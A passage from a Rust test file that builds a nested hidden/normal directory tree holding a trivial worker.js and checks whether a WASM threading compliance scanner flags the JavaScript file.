            .join("wasm-pack")
            .join("scripts");
        fs::create_dir_all(&complex_path).expect("mkdir complex path failed");

        let worker_js = complex_path.join("worker.js");
        fs::write(&worker_js, "self.onmessage = () => {};").expect("write failed");

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        if let Some(check) = js_check {
            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
                eprintln!(
                    "🔴 FALSIFIED: Scanner missed JS in mixed hidden/normal tree!\n\
                     Path: target/release/.cache/wasm-pack/scripts/worker.js"
                );
            } else {
                eprintln!("✅ PASS: Scanner found JS in mixed hidden/normal directory tree");
            }
        }
    }
}
